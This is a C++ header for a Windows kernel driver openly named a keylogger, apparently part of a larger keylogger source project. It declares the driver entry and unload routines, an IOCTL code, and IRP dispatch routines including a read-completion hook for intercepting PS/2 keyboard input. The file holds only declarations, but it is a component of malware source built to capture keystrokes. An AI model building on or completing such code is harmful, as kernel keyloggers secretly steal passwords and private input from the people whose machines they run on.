#ifndef _DISTANCE_KEYLOGGER_HPP_
#define _DISTANCE_KEYLOGGER_HPP_

#include <wdm.h>
#include "KeyloggerCore.hpp"

// Warning: Driver is supporting only PS/2 keyboard

#define IOCTL_DISTANCE_KEYLOGGER \
    CTL_CODE(0x8000u, 0x800u, METHOD_BUFFERED, FILE_WRITE_ACCESS)

extern "C"
{
    DRIVER_INITIALIZE DriverEntry;
    DRIVER_UNLOAD KeyloggerUnload;


    _Dispatch_type_(IRP_MJ_READ)
    _IRQL_requires_max_(APC_LEVEL)
    DRIVER_DISPATCH KeyloggerDispatchRead;
    
    _Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
    _IRQL_requires_max_(APC_LEVEL)
    DRIVER_DISPATCH KeyloggerDispatchDeviceControl;

    _IRQL_requires_max_(APC_LEVEL)
    DRIVER_DISPATCH KeyloggerDispatchPass;

    _IRQL_requires_max_(APC_LEVEL)
    DRIVER_DISPATCH KeyloggerDispatchCreateClose;

    _IRQL_requires_max_(DISPATCH_LEVEL)
    IO_COMPLETION_ROUTINE ReadComplete;
}


#ifdef ALLOC_PRAGMA

#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, KeyloggerUnload)
#pragma alloc_text(PAGE, KeyloggerDispatchRead)
#pragma alloc_text(PAGE, KeyloggerDispatchPass)

#endif

#endif // _DISTANCE_KEYLOGGER_HPP_